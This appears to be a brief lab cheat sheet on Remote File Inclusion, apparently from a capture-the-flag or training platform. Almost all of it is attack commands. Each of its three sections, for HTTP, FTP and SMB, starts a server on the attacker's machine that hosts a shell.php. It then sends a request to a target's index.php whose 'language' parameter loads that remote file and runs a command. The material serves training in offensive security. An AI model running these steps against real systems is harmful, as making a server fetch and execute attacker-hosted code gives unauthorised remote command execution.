# Remote File Inclusion

## HTTP

```sh
my@attack:~$ python3 -m http.server 8888
```

```sh
my@attack:~$ firefox "http://94.237.59.180:37581/index.php?language=http://10.10.14.229:8888/shell.php&cmd=whoami"
```

## FTP

```sh
my@attack:~$ sudo python3 -m pyftpdlib -p 21
```

```sh
my@attack:~$ firefox "http://94.237.59.180:37581/index.php?language=ftp://10.10.14.229:21/shell.php&cmd=whoami"
```

## SMB

```sh
my@attack:~$ sudo smbserver.py -smb2support share /tmp
```

```sh
my@attack:~$ firefox "http://94.237.59.180:37581/index.php?language=\\\\10.10.14.229\share\shell.php&cmd=whoami"
```
